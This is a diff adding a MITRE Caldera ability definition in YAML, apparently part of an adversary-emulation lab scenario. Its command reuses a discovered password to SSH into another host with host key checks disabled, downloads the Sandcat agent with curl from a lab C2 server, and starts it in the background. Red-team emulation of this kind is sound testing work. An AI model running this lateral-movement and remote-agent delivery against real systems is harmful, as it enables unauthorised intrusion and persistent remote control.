@@ -1,0 +1,51 @@
+- id: a1301004-0004-4004-8004-000000000004
+  name: ABL-S13-LNX-PIVOT-USER-LINUX
+  description: Pivot from the pool node that discovered the clue to user-linux-01 and deliver Sandcat
+  tactic: lateral-movement
+  technique:
+    attack_id: T1021.004
+    name: SSH
+  platforms:
+    linux:
+      sh:
+        command: |
+          hostname | grep -Eq '^pool-node-[0-9]+$' || exit 0;
+          if sshpass -p '#{host.pivot.target.password}' ssh \
+            -o StrictHostKeyChecking=no \
+            -o UserKnownHostsFile=/dev/null \
+            -o ConnectTimeout=5 \
+            -p '#{host.pivot.target.port}' \
+            '#{host.pivot.target.user}@#{host.pivot.target.host}' \
+            "BASE=/home/#{host.pivot.target.user}/.caldera; BIN=\${BASE}/sandcat-#{host.pivot.target.name}; LOG=\${BASE}/logs/sandcat-#{host.pivot.target.name}.log; PIDFILE=\${BASE}/sandcat-#{host.pivot.target.name}.pid; mkdir -p \${BASE}/logs || exit 1; curl -fsSL -X POST -H file:sandcat.go -H platform:linux http://192.168.56.10:8888/file/download -o \${BIN} || exit 1; chmod +x \${BIN} || exit 1; pkill -f \${BIN} >/dev/null 2>&1 || true; nohup \${BIN} -server http://192.168.56.10:8888 -group s13-flow -paw '#{host.pivot.target.name}' -v >>\${LOG} 2>&1 </dev/null & echo \$! > \${PIDFILE}; sleep 5; test -s \${PIDFILE} && kill -0 \$(cat \${PIDFILE})"; then
+            echo "S13_PIVOT_DELIVERY_OK target=#{host.pivot.target.name}";
+          else
+            echo "S13_PIVOT_DELIVERY_FAIL target=#{host.pivot.target.name}";
+          fi
+        timeout: 300
+requirements:
+  - module: plugins.stockpile.app.requirements.paw_provenance
+    relationship_match:
+      - source: host.pivot.target.host
+  - module: plugins.stockpile.app.requirements.basic
+    relationship_match:
+      - source: host.pivot.target.host
+        edge: has_port
+        target: host.pivot.target.port
+  - module: plugins.stockpile.app.requirements.basic
+    relationship_match:
+      - source: host.pivot.target.host
+        edge: has_user
+        target: host.pivot.target.user
+  - module: plugins.stockpile.app.requirements.basic
+    relationship_match:
+      - source: host.pivot.target.user
+        edge: has_password
+        target: host.pivot.target.password
+  - module: plugins.stockpile.app.requirements.basic
+    relationship_match:
+      - source: host.pivot.target.host
+        edge: maps_name
+        target: host.pivot.target.name
+  singleton: false
+  repeatable: false
+  delete_payload: false
